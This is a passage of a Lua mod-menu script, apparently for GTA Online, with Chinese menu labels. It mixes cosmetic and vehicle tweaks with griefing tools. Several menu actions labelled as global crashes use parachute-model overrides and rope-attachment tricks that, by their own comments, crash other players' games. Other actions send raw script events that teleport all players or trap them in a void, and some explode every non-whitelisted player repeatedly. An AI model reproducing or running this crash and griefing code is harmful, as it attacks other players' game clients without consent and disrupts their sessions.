    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
    util.yield(1000)
    for i = 0 , 2 do
    PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
    end
    util.yield(1000)
    menu.trigger_commands("tpmazehelipad")
    bush_hash = 720581693
                                STREAMING.REQUEST_MODEL(bush_hash)
  while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
       util.yield()
     end
    PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
       util.yield(1000)
    for i = 0 , 5 do
    PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
    end
    util.yield(1000)
    menu.trigger_commands("tpmazehelipad")
    bush_hash = 1117917059
    STREAMING.REQUEST_MODEL(bush_hash)
while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
util.yield()
end
PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
util.yield(1000)
for i = 0 , 2 do
PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
end
util.yield(1000)
menu.trigger_commands("tpmazehelipad")
bush_hash = 4237751313
STREAMING.REQUEST_MODEL(bush_hash)
while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
util.yield()
end
PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
util.yield(1000)
for i = 0 , 2 do
PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
end
util.yield(1000)
menu.trigger_commands("tpmazehelipad")
bush_hash = 2365747570
STREAMING.REQUEST_MODEL(bush_hash)
while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
util.yield()
end
PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
util.yield(1000)
for i = 0 , 2 do
PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
end
util.yield(1000)
menu.trigger_commands("tpmazehelipad")
end
notification("崩溃执行结束" ,colors.black)
end)
    menu.action(quanjubengkui, "圣诞全局崩溃", {}, "崩溃全局", function()
         store_dir = filesystem.store_dir() .. '\\YMss\\'
            sound_selection_dir = store_dir .. '\\sound2.txt'
               if not filesystem.is_dir(store_dir) then
                util.toast("夜幕音频没有正确安装！.")
                util.stop_script()
             end
           fp = io.open(sound_selection_dir, 'r')
              local file_selection = fp:read('*a')
            fp:close()
            local sound_location = store_dir .. '\\' .. file_selection
            if not filesystem.exists(sound_location) then
              util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
             else
                PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
             end
             util.keep_running()
        baga()
       notification( "崩溃完成", green)
    end)
    menu.action(quanjubengkui, "息怒崩（极其生气的时候用此功能）", {}, "请在极其生气时使用此功能", function()
      local notification = b_notifications.new()
      notification.notify("你好陌生人！","游戏并非只有制裁，更多的是带给其他人快乐，希望可以给其他玩家一个好的游戏体验！")
      YMscript_logo = directx.create_texture(filesystem.scripts_dir() .. '/YMS/'..'xinu.png')
      if SCRIPT_MANUAL_START then
    AUDIO.PLAY_SOUND(-1, "Virus_Eradicated", "LESTER1A_SOUNDS", 0, 0, 1)
    logo_alpha = 0
    logo_alpha_incr = 0.01
    logo_alpha_thread = util.create_thread(function (thr)
        while true do
            logo_alpha = logo_alpha + logo_alpha_incr
            if logo_alpha > 1 then
                logo_alpha = 1
            elseif logo_alpha < 0 then
                logo_alpha = 0
                util.stop_thread()
            end
            util.yield()
        end
    end)

    logo_thread = util.create_thread(function (thr)
        starttime = os.clock()
        local alpha = 0
        while true do
            directx.draw_texture(YMscript_logo,  0.1, 0.3, 0.3, 0.6, 0.35, 0.5,0, 3, 3, 3, logo_alpha)
            timepassed = os.clock() - starttime
            if timepassed > 6 then
                logo_alpha_incr = -0.01
            end
            if logo_alpha == 0 then
                util.stop_thread()
            end
            util.yield()
        end
    end)
end
      store_dir = filesystem.store_dir() .. '\\YMss\\'
      sound_selection_dir = store_dir .. '\\sound4.txt'
      if not filesystem.is_dir(store_dir) then
         util.toast("夜幕音频没有正确安装！.")
         util.stop_script()
end
fp = io.open(sound_selection_dir, 'r')
local file_selection = fp:read('*a')
fp:close()
local sound_location = store_dir .. '\\' .. file_selection
if not filesystem.exists(sound_location) then
    util.toast("[Startup Sound] " .. file_selection .. " 未找到音源.")
else
    PlaySound(sound_location, SND_FILENAME | SND_ASYNC)
end
util.keep_running()
        jesus_help_me()
    end)
menu.action(quanjubengkui, "撒比小呆呆全局崩", {}, "", function()
    nature()
    CARGO()
    math1()
    notification("崩溃结束" ,colors.black)
end)
airplane_collapsed = menu.list(quanjubengkui, "飞机模型崩溃", {}, "慎用！！！")
    menu.toggle_loop(airplane_collapsed, "开始崩溃", {}, "耗时很久", function()
        airplane_collapsed1()
    end)
    players.dispatch_on_join()
    menu.action(airplane_collapsed, "防崩镜头关闭", {}, "", function()
        menu.trigger_commands("anticrashcamera off")
    end)
function nature()
    local user = players.user()
    local user_ped = players.user_ped()
    local model = util.joaat("h4_prop_bush_mang_ad") -- special op object so you dont have to be near them :D
        util.yield(100)
        ENTITY.SET_ENTITY_VISIBLE(user_ped, false)
        for i = 0, 110 do
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, model)
            PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
            util.yield(25)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
        end
        for i = 1, 5 do
            util.spoof_script("freemode", SYSTEM.WAIT) -- preventing wasted screen
        end
        ENTITY.SET_ENTITY_HEALTH(user_ped, 0) -- killing ped because it will still crash others until you die (clearing tasks doesnt seem to do much)
        local pos = players.get_position(user)
        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x, pos.y, pos.z, 0, false, false, 0)
        ENTITY.SET_ENTITY_VISIBLE(user_ped, true)
        end
function CARGO()
    menu.trigger_commands("anticrashcam on")
    local cspped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
    local TPpos = ENTITY.GET_ENTITY_COORDS(cspped, true)
    local cargobob = CreateVehicle(0XFCFCB68B, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
    local veh = CreateVehicle(0X187D938D, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
    local vehPos = ENTITY.GET_ENTITY_COORDS(veh, true)
    local newRope = PHYSICS.ADD_ROPE(TPpos.x, TPpos.y, TPpos.z, 0, 0, 10, 1, 1, 0, 1, 1, false, false, false, 1.0, false, 0)
    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, veh, cargobobPos.x, cargobobPos.y, cargobobPos.z, vehPos.x, vehPos.y, vehPos.z, 2, false, false, 0, 0, "Center", "Center")
    util.yield(2500)
    entities.delete_by_handle(cargobob)
    entities.delete_by_handle(veh)
    PHYSICS.DELETE_CHILD_ROPE(newRope)
    menu.trigger_commands("anticrashcam off")
end
function math1()
    local cspped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
     local playpos = ENTITY.GET_ENTITY_COORDS(cspped, true)
     playpos.x = playpos.x + 10
     local carc = CreateVehicle(2598821281, playpos, ENTITY.GET_ENTITY_HEADING(cspped), true)
     local carcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
     local pedc = CreatePed(26, 2597531625, playpos, 0)
     local pedcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
     local ropec = PHYSICS.ADD_ROPE(playpos.x, playpos.y, playpos.z, 0, 0, 0, 1, 1, 0.00300000000000000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, 0)
     PHYSICS.ATTACH_ENTITIES_TO_ROPE(ropec,carc,pedc,carcPos.x, carcPos.y, carcPos.z ,pedcPos.x, pedcPos.y, pedcPos.z,2, false, false, 0, 0, "Center","Center")
     util.yield(2500)
     PHYSICS.DELETE_CHILD_ROPE(ropec)
     entities.delete_by_handle(carc)
     entities.delete_by_handle(pedc)
end
 TTPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
TTPos = ENTITY.GET_ENTITY_COORDS(TTPed, true)
quanjuegao = menu.list(quanju,"全局恶搞", {},"恶搞全局~")
   menu.action(quanjuegao, "发送所有玩家海滩", {}, "", function () 
        sendscriptevent_one()
    end)
    menu.action(quanjuegao, "发送所有玩家岛屿", {}, "", function () 
        sendscriptevent_two()
    end)
    menu.action(quanjuegao, "全局公寓邀请", {}, "", function () 
        sendscriptevent_three()
    end)
    menu.action(quanjuegao, "全局送进任务", {}, "", function () 
    for PlayerID = 0, 31 do
		if PlayerID ~= players.user() and players.exists(PlayerID) then

			util.trigger_script_event(1 << PlayerID, {1858712297, -1, 1, 1, 0, 1, 0,PLAYER.GET_PLAYER_INDEX(), PlayerID})
		end
	end
end)
menu.action(quanjuegao, "全局黑色虚空", {}, "", function () 
    for pid = 0, 31 do
        if pid ~= players.user() and players.exists(pid) then
            util.trigger_script_event(1 << pid, {1268038438, pid, 81, 1, 0, 1, 1130429716, -1001012850, 1106067788, 0, 0, 1, 2123789977, 1, -1})
        end
    end
end)
menu.action(quanjuegao, '爆炸所有人', {}, '爆炸所有玩家.', function()
    local playerList = getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
    for _, pid in pairs(playerList) do
        local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        explodePlayer(playerPed, false, expSettings)
    end
end)
explodeLoopAll = menu.toggle_loop(quanjuegao, '循环爆炸所有人', {}, '不断的爆炸所有玩家.', function()
    local playerList = getNonWhitelistedPlayers(whitelistListTable, whitelistGroups, whitelistedName)
    for _, pid in pairs(playerList) do
        local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        explodePlayer(playerPed, true, expSettings)
    end
    util.yield(getTotalDelayabcd(expLoopDelay))
end)
menu.action(online, "玩家栏", {}, "", function()
    menu.trigger_commands("YMScript " .. players.get_name(players.user()))
end)

local exterior = menu.list(self, "外观选项", {}, "")
menu.toggle(exterior, "金色翅炎", {}, "如果不起作用请重试", function(on_toggle)
	if on_toggle then	
	local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true)
	local wings = OBJECT.CREATE_OBJECT(util.joaat("vw_prop_art_wings_01a"), pos.x, pos.y, pos.z, true, true, true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("vw_prop_art_wings_01a"))
	ENTITY.ATTACH_ENTITY_TO_ENTITY(wings, PLAYER.PLAYER_PED_ID(), PED.GET_PED_BONE_INDEX(PLAYER.PLAYER_PED_ID(), 0x5c01), -1.0, 0.0, 0.0, 0.0, 90.0, 0.0, false, true, false, true, 0, true)
else
	local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			end
end)
menu.action(exterior, "恶灵骑士", {""}, "获得恶灵骑士。", function()
    elqes()
end)
local _LR = menu.list(exterior, '火焰之翼选项', {}, '')

        
        menu.toggle(_LR, '火焰之翼', {'fireWings'}, '请打开无敌食用！！！~.', function (toggle)
            firewing(toggle)
        end)

        menu.slider(_LR, '火焰之翼比例', {'fireWingsScale'}, '', 1, 100, 3, 1, function(value)
            firewingscale(value)
        end)

        menu.rainbow(menu.colour(_LR, '火焰之翼颜色', {'JSfireWingsColour'}, '', fireWingsSettings.colour, false, function(colour)
            firewingcolour(colour)
        end))
        menu.list_action(exterior, "寄吧选项", {}, "你好瑟瑟", opt_pp, function(index, value, click_type)
            getbigjb(index, value, click_type)
        end)
menu.toggle(exterior, "雪人先生",{""}, "",function(on)
    local sonwman = "prop_prlg_snowpile"
    if on then
        attach_to_player(sonwman, 0, 0.0, 0, 0, 0, 0,0)
        attach_to_player(sonwman, 0, 0.0, 0, -0.5, 0, 0,0)--v_ilev_exball_grey
        attach_to_player(sonwman, 0, 0.0, 0, -1, 0, 0,0)
    else
        delete_object(sonwman)
    end
end)
    function loadModel(hash)
        STREAMING.REQUEST_MODEL(hash)
        while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end
    end
        local fireWings = {
            [1] = {pos = {[1] = 120, [2] =  75}},
            [2] = {pos = {[1] = 120, [2] = -75}},
            [3] = {pos = {[1] = 135, [2] =  75}},
            [4] = {pos = {[1] = 135, [2] = -75}},
            [5] = {pos = {[1] = 180, [2] =  75}},
            [6] = {pos = {[1] = 180, [2] = -75}},
            [7] = {pos = {[1] = 190, [2] =  75}},
            [8] = {pos = {[1] = 190, [2] = -75}},
			[9] = {pos = {[1] = 130, [2] =  75}},
            [10] = {pos = {[1] = 130, [2] = -75}},
			[11] = {pos = {[1] = 140, [2] =  75}},
            [12] = {pos = {[1] = 140, [2] = -75}},
			[13] = {pos = {[1] = 150, [2] =  75}},
            [14] = {pos = {[1] = 150, [2] = -75}},
			[15] = {pos = {[1] = 210, [2] =  75}},
            [16] = {pos = {[1] = 210, [2] = -75}},
			[17] = {pos = {[1] = 195, [2] =  75}},
            [18] = {pos = {[1] = 195, [2] = -75}},
			[19] = {pos = {[1] = 160, [2] =  75}},
            [20] = {pos = {[1] = 160, [2] = -75}},
			[21] = {pos = {[1] = 170, [2] =  75}},
            [22] = {pos = {[1] = 170, [2] = -75}},
			[23] = {pos = {[1] = 200, [2] =  75}},
            [24] = {pos = {[1] = 200, [2] = -75}},
        }
        local fireWingsSettings = {
            scale = 0.3,
            colour = mildOrangeFire,
            on = false
        }
posx=25
posy=0
posz=50
        local ptfxEgg
        menu.toggle(exterior, '火焰之翼V2', {''}, '2t同款翅膀', function (toggle)
            fireWingsSettings.on = toggle
            if fireWingsSettings.on then
                ENTITY.SET_ENTITY_PROOFS(players.user_ped(), false, true, false, false, false, false, 1, false)
                if ptfxEgg == nil then
                    local eggHash = 1803116220
                    loadModel(eggHash)
                    ptfxEgg = entities.create_object(eggHash, ENTITY.GET_ENTITY_COORDS(players.user_ped()))
                    ENTITY.SET_ENTITY_COLLISION(ptfxEgg, false, false)
                    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(eggHash)
                end
                for i = 1, #fireWings do
                    while not STREAMING.HAS_NAMED_PTFX_ASSET_LOADED('weap_xs_vehicle_weapons') do
                        STREAMING.REQUEST_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
                        util.yield()
                    end
                    GRAPHICS.USE_PARTICLE_FX_ASSET('weap_xs_vehicle_weapons')
                    fireWings[i].ptfx = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY('muz_xs_turret_flamethrower_looping', ptfxEgg, 0, 0, 0.1, fireWings[i].pos[1], 0, fireWings[i].pos[2], 1, false, false, false)

                    util.create_tick_handler(function()
                        local rot = ENTITY.GET_ENTITY_ROTATION(players.user_ped(), 2)
                        ENTITY.ATTACH_ENTITY_TO_ENTITY(ptfxEgg, players.user_ped(), -1, 0, 0, 0, rot.x, rot.y, rot.z, false, false, false, false, 0, false)
                        ENTITY.SET_ENTITY_ROTATION(ptfxEgg, rot.x, rot.y, rot.z, 2, true)
                        for i = 1, #fireWings do
                            GRAPHICS.SET_PARTICLE_FX_LOOPED_SCALE(fireWings[i].ptfx, fireWingsSettings.scale)
                            GRAPHICS.SET_PARTICLE_FX_LOOPED_COLOUR(fireWings[i].ptfx, posx, posy,posz)
    posx = posx + 0.145
    if posx > 0.96 then
    posy = posy + 5
	posz = posz +6
    posx = 0.001
	end                        end
                        ENTITY.SET_ENTITY_VISIBLE(ptfxEgg, false)
                        return fireWingsSettings.on
                    end)				
                end			
            else
                for i = 1, #fireWings do
                    if fireWings[i].ptfx then
                        GRAPHICS.REMOVE_PARTICLE_FX(fireWings[i].ptfx, true)
                        fireWings[i].ptfx = nil
                    end
                    if ptfxEgg then
                        entities.delete_by_handle(ptfxEgg)
                        ptfxEgg = nil
                    end
                end
                STREAMING.REMOVE_NAMED_PTFX_ASSET('weap_xs_vehicle_weapons')
            end
        end)
local proofsList = menu.list(self, "伤害免疫", {}, "Custom Godmode")
local immortalityCmd = menu.ref_by_path("Self>Immortality")
for _,data in pairs(proofs) do
    menu.toggle(proofsList, data.name, {data.name:lower().."proof"}, "让您对"..data.name:lower().."伤害免疫", function(toggle)
        data.on = toggle
    end)
end
util.create_tick_handler(function()
    local local_player = players.user_ped()
    if not menu.get_value(immortalityCmd) then
        ENTITY.SET_ENTITY_PROOFS(local_player, proofs.bullet.on, proofs.fire.on, proofs.explosion.on, proofs.collision.on, proofs.melee.on, proofs.steam.on, false, proofs.drown.on)
    end
end)
menu.toggle_loop(jiashi, "隐藏载具无敌", {}, "不会被大多数菜单检测", function()
    ENTITY.SET_ENTITY_PROOFS(entities.get_user_vehicle_as_handle(), true, true, true, true, true, 0, 0, true)
    end, function() ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(player), false, false, false, false, false, 0, 0, false)
end)
menu.toggle_loop(jiashi, "转向灯", {}, "按A键和D键使用", function()
    if(PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false)) then
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)
        local left = PAD.IS_CONTROL_PRESSED(34, 34)
        local right = PAD.IS_CONTROL_PRESSED(35, 35)
        local rear = PAD.IS_CONTROL_PRESSED(130, 130)
        if left and not right and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
        elseif right and not left and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        elseif rear and not left and not right then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        else
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, false)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, false)
        end
    end
end)
menu.toggle_loop(jiashi, '引擎永不熄火', {'alwayson'}, '', function()
	local vehicle = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false)
	if ENTITY.DOES_ENTITY_EXIST(vehicle) then
		VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
		VEHICLE.SET_VEHICLE_LIGHTS(vehicle, 0)
		VEHICLE._SET_VEHICLE_LIGHTS_MODE(vehicle, 2)
	end
end)
menu.toggle_loop(jiashi, "随机升级", {}, "仅适用于您出于某种原因生成的车辆", function()
    local mod_types = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 12, 14, 15, 16, 23, 24, 25, 27, 28, 30, 33, 35, 38, 48}
    if PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) then
        for i, upgrades in ipairs(mod_types) do
            VEHICLE.SET_VEHICLE_MOD(entities.get_user_vehicle_as_handle(), upgrades, math.random(0, 20), false)
        end
    end
    util.yield(100)
end)

menu.toggle(jiashi, "游戏时速表", {"speedmeteor"}, "", function(state)
        speedm = state  
        while speedm do
            local ent
                local ent1 = players.user_ped()
                local ent2 = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
                if PED.IS_PED_IN_ANY_VEHICLE(ent1,true) then
                    ent = ent2
                else
                    ent = ent1
                end
                local speed = ENTITY.GET_ENTITY_SPEED(ent)
                local speedcalc = speed * 3.6
                myspeed1 = math.ceil(speedcalc)
            util.yield()
            draw_string(string.format("~bold~~italic~~b~"..myspeed1 .. "  ~r~KM/H"), 0.76,0.8, 1,6)
            end
    end,speedm)
menu.trigger_commands("speedmeteor on")
local veh_jump = menu.list(jiashi, "可以跳跃的车")
local force = 25.00
menu.slider_float(veh_jump, "跳跃倍率", {"jumpiness"}, "", 0, 10000, 2500, 100, function(value)
    force = value / 100
end)
menu.toggle_loop(veh_jump, "启动", {"vehiclejump"}, "按空格键跳跃~.", function()
    local veh = entities.get_user_vehicle_as_handle()
    if veh ~= 0 and ENTITY.DOES_ENTITY_EXIST(veh) and PAD.IS_CONTROL_JUST_RELEASED(0, 102) then
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, force/1.5, force, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        repeat
            util.yield()
        until not ENTITY.IS_ENTITY_IN_AIR(veh)
    end
end)
local piaoyi = menu.list(jiashi, "漂移选项")
menu.toggle_loop(piaoyi, "按住shift键进行漂移", {"dshiftdrift"}, "你听到我说的了.", function(on)
    if PAD.IS_CONTROL_PRESSED(21, 21) then
        VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, true)
        VEHICLE.SET_VEHICLE_REDUCE_GRIP_LEVEL(player_cur_car, 0.0)
    else
        VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, false)
    end
end)
local shift_drift_toggle = false 
menu.toggle(piaoyi, "开关换挡(shift)漂移", {"shiftdrifttoggle"}, "您应该将热键绑定到此开关，否则此功能将变得有点无用", function(on)
    shift_drift_toggle = on
    while true do
        if player_cur_car ~= 0 then 
            if not shift_drift_toggle then 
                VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, false)
                break 
            end
            VEHICLE.SET_VEHICLE_REDUCE_GRIP(player_cur_car, true)
            VEHICLE.SET_VEHICLE_REDUCE_GRIP_LEVEL(player_cur_car, 0.0)
        end
        util.yield()
    end
end)
menu.toggle(piaoyi, "头文字D模式", {"initiald"}, "应用预定义的载具操纵配置,使您更容易漂移.这不会神奇地让你成为一名漂移高手,也不会神奇地使每辆车都擅长漂移.", function(on, click_type)
    initial_d_mode = on
    initial_d_score_thread()
    if player_cur_car ~= 0 then 
        if on then
            set_vehicle_into_drift_mode(player_cur_car)
        else
            for offset, value in pairs(last_vehicle_handling_data) do
                set_vehicle_handling_value(player_cur_car, offset, value)
            end
        end
    end
end)
menu.toggle_loop(piaoyi,  "相机方向推力", {"thrustindir"}, "按住X并保持此状态,将载具推向摄相机所面对的方向。用于维持漂移状态。", function(on)
    if player_cur_car ~= 0 and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then 
        if util.is_key_down("X") then 
            cam_direction()
        else 
            before_vel = ENTITY.GET_ENTITY_VELOCITY(player_cur_car)
        end
    end
end)
menu.slider_float(piaoyi, "相机方向推力的速度", {"thrustindiradd"}, "相机方向的推力需要增加多少额外速度", 0, 3000, 125, 1, function(s)
    thrust_cam_dir_add = s * -0.001
end)
local vehicle_fly = menu.list(jiashi, "载具飞行", {}, "")
menu.toggle(vehicle_fly, "载具想飞天", {"vehfly"}, "汽车成仙。", function(on_click)
    is_vehicle_flying = on_click
end)
menu.slider(vehicle_fly, "速度", {"speed"}, "", 1, 100, 6, 1, function(on_change) 
    speed = on_change
end)
menu.toggle(vehicle_fly, "触发后不停止", {"dontstop"}, "", function(on_click)
    dont_stop = on_click
end)
menu.toggle(vehicle_fly, "无碰撞", {"nocolision"}, "", function(on_click)
    no_collision = on_click
end)
util.create_tick_handler(function() 
    VEHICLE.SET_VEHICLE_GRAVITY(PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false), not is_vehicle_flying)
    if is_vehicle_flying then do_vehicle_fly() else ENTITY.SET_ENTITY_COLLISION(PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false), true, TRUE); end
    return true
end)
util.on_stop(function() 
    VEHICLE.SET_VEHICLE_GRAVITY(PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false), true)
	ENTITY.SET_ENTITY_COLLISION(PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false), true, TRUE);
end)
menu.toggle_loop(jiashi, "载具轮胎效果", {}, "", function ()
    cargoodeffect()
end)
local jesus_main = menu.list(jiashi, "自动驾驶", {}, "")
    menu.slider_text(jesus_main, "驾驶风格", {}, "单击以选择样式", style_names, function(index, value)
        pluto_switch value do
            case "正常":
                style = 786603
                break
            case "冲刺":
                style = 1074528293
                break
            case "半冲刺":
                style = 8388614
                break
            case "反向":
                style = 1076
                break
            case "无视红绿灯":
                style = 2883621
                break
            case "避开交通":
                style = 786603
                break
            case "极度避开交通":
                style = 6
                break
            case "有时超车":
                style = 5
                break
            end
        end)
        
    jesus_toggle = menu.toggle(jesus_main, "启用", {}, "", function(toggled)
        if toggled then
            local player = players.user_ped()
            local pos = ENTITY.GET_ENTITY_COORDS(player, false)
            local player_veh = entities.get_user_vehicle_as_handle()
    
            if not PED.IS_PED_IN_ANY_VEHICLE(player, false) then 
                util.toast("请在载具里使用. :)")
            return end
    
            local jesus = util.joaat("u_m_m_jewelsec_01")
            request_model(jesus)
    
            
            jesus_ped = entities.create_ped(26, jesus, pos, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(jesus_ped, true)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(jesus_ped, true)
            PED.SET_PED_INTO_VEHICLE(player, player_veh, -2)
            PED.SET_PED_INTO_VEHICLE(jesus_ped, player_veh, -1)
            PED.SET_PED_KEEP_TASK(jesus_ped, true)
    
            if HUD.IS_WAYPOINT_ACTIVE() then
                local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
                TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(jesus_ped, player_veh, pos.x, pos.y, pos.z, 9999, style, 0)
            else
                util.toast("请先设置一个导航点. :/")
                    menu.set_value(jesus_toggle, false)
            end
        else
            if jesus_ped ~= nil then 
                entities.delete_by_handle(jesus_ped)
            end
        end
    end)
local rgbvm = menu.list(jiashi, '变色载具', {}, '')
menu.toggle_loop(rgbvm, '彩虹变色', {}, '将载具颜色和霓虹灯更改为彩色', function ()
    rainbow_car()
end)
menu.slider(rgbvm, '速度', {''}, '调整车漆颜色变换的速度', 1, 1000, 100, 10, function (c)
    set_speed_rainbowcar(c)
end)
menu.toggle_loop(rgbvm, '彩虹大灯', {}, '将霓虹灯/大灯/内饰更改为相同颜色', function ()
    rainbow_car_light()
end)
menu.slider(rgbvm, '速度', {''}, '调整灯光颜色变换的速度', 1, 1000, 100, 10, function (c)
    set_speed_light(c)
end)
menu.toggle_loop(jiashi, "喇叭加速", {}, "", function()
    remote_horn_boost(players.user())
end)
util.ensure_package_is_installed("lua/yymmlib/YMScaleformLib")
local sfchat = require("lib.yymmlib.YMScaleformLib")("multiplayer_chat")
sfchat:draw_fullscreen()
focusref = {}
isfocused = false
selectedcolormenu = 0
colorselec = 1
allchatlabel = util.get_label_text("MP_CHAT_ALL")
teamchatlabel = util.get_label_text("MP_CHAT_TEAM")
local Languages = {
	{ Name = "Afrikaans", Key = "af" },
	{ Name = "Albanian", Key = "sq" },
	{ Name = "Arabic", Key = "ar" },
	{ Name = "Azerbaijani", Key = "az" },
	{ Name = "Basque", Key = "eu" },
	{ Name = "Belarusian", Key = "be" },
	{ Name = "Bengali", Key = "bn" },
	{ Name = "Bulgarian", Key = "bg" },
	{ Name = "Catalan", Key = "ca" },
	{ Name = "Chinese Simplified", Key = "zh-cn" },
	{ Name = "Chinese Traditional", Key = "zh-tw" },
	{ Name = "Croatian", Key = "hr" },
	{ Name = "Czech", Key = "cs" },
	{ Name = "Danish", Key = "da" },
	{ Name = "Dutch", Key = "nl" },
	{ Name = "English", Key = "en" },
	{ Name = "Esperanto", Key = "eo" },
	{ Name = "Estonian", Key = "et" },
	{ Name = "Filipino", Key = "tl" },
	{ Name = "Finnish", Key = "fi" },
	{ Name = "French", Key = "fr" },
	{ Name = "Galician", Key = "gl" },
	{ Name = "Georgian", Key = "ka" },
	{ Name = "German", Key = "de" },
	{ Name = "Greek", Key = "el" },
	{ Name = "Gujarati", Key = "gu" },
	{ Name = "Haitian Creole", Key = "ht" },
	{ Name = "Hebrew", Key = "iw" },
	{ Name = "Hindi", Key = "hi" },
	{ Name = "Hungarian", Key = "hu" },
	{ Name = "Icelandic", Key = "is" },
	{ Name = "Indonesian", Key = "id" },
	{ Name = "Irish", Key = "ga" },
	{ Name = "Italian", Key = "it" },
	{ Name = "Japanese", Key = "ja" },
	{ Name = "Kannada", Key = "kn" },
	{ Name = "Korean", Key = "ko" },
	{ Name = "Latin", Key = "la" },
	{ Name = "Latvian", Key = "lv" },
	{ Name = "Lithuanian", Key = "lt" },
	{ Name = "Macedonian", Key = "mk" },
	{ Name = "Malay", Key = "ms" },
	{ Name = "Maltese", Key = "mt" },
	{ Name = "Norwegian", Key = "no" },
	{ Name = "Persian", Key = "fa" },
	{ Name = "Polish", Key = "pl" },
	{ Name = "Portuguese", Key = "pt" },
	{ Name = "Romanian", Key = "ro" },
	{ Name = "Russian", Key = "ru" },
